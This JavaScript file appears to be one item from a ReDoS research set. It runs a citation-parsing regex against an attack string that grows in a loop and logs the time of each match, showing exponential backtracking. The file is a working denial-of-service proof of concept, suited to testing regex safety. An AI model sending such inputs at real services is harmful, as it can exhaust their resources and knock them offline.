/* 3031
 * ([0-9]* {0,2}[A-Z]{1}\w+[,.;:]? {0,4}[xvilcXVILC\d]+[.,;:]( {0,2}[\d-,]{1,7})+)([,.;:] {0,4}[xvilcXVILC]*[.,;:]( {0,2}[\d-,]{1,7})+)*
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:"A1x.1"+",,"*16+"!1 __EOA(iv)"
 */
var REGEX = /([0-9]* {0,2}[A-Z]{1}\w+[,.;:]? {0,4}[xvilcXVILC\d]+[.,;:]( {0,2}[\d-,]{1,7})+)([,.;:] {0,4}[xvilcXVILC]*[.,;:]( {0,2}[\d-,]{1,7})+)*/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = 'A1x.1' + ',,'.repeat(i*1) + '!1 __EOA(iv)'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}